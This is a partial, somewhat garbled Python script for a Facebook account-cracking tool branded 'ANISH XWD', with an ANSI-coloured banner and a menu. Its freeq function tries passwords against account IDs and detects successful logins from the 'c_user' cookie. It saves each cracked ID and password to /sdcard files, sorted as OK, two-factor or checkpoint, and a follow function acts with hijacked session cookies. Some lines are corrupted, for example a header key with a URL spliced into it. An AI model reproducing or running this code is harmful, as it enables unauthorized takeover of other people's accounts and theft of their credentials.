...
logo ="""     \033[1;37m____ \033[1;32m             ______     _______   \033[1;37m____   
    \033[1;37m(  __)          _   _ _____  _____ _    _                                                                           (__  )  
    \033[1;37m| (                                                           ) | 
    \033[1;37m| |                          _   _ _____  _____ _    _        | |
              | |         /\   | \ | |_   _|/ ____| |  | |                  | |
              | |        /  \  |  \| | | | | (___ | |__| |                  | |
              | |       / /\ \ | . ` | | |  \___ \|  __  |                  | |
              | |      / ____ \| |\  |_| |_ ____) | |  | |                  | |
    ...
    \033[1;37m| (__                                                       __) |  
    \033[1;37m(____)                                                     (____)
\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36m𝗔𝗡𝗜𝗦𝗛✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32m ANISH XWD HERE💋      \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32m ANISH XWD HERE     \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m ANISH-XD                \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mANISH XWD                \033[1;31m   │
\033[1;31m│\033[1;33[1;32mVERSION   \033[1;31m ➟   \033[1;32m1.2                          \033[1;31m   │
...
print("")
print(f"{BLUE} PUT YOUR NAME LIKE ANISH'PRAJWAL'NITESH'MILAN")
...
def follow(ses,coki):
    ses.headers.update({"accept-lFacebook'https://www.facebook.com/profile.php?id=100000532695677e":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.faceb', cookies={'cookie': coki}).text, 'html.parser')
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {ANISH()} {WHITE}]")
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=100000532695677")
        XYZ()
    elif hamii in ["3","03"]:
        os.system("xdg-open https://wa.me/+9779842484549")
        XYZ()
    elif hamii in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/ANISH-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
...
def freeq(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio ANISH_OK.mp3")
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                cek_apk(session,coki)
                open('/sdcard/ANISH-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio ANISH_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/ANISH-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio ANISH_CP.mp3")
                    print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/ANISH-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ANISH 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
